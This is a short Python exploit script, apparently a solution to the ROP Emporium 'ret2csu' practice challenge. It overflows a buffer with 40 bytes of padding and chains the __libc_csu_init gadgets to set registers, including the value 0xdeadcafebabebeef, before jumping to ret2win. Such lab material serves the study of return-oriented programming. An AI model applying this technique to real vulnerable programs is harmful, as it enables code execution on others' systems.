from roppy import *

p = process("/home/robin/ROP-Emporium/ret2csu")
elf = ELF("/home/robin/ROP-Emporium/ret2csu")
payload = b"A"*40
payload += p64(0x40089a)
payload += p64(0)
payload += p64(1)
payload += p64(0x600e38)
payload += p64(0)
payload += p64(0x0)
payload += p64(0xdeadcafebabebeef)
payload += p64(0x400880)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(elf.symbols['ret2win'])

p.recvline()
p.sendline(payload)
p.interact()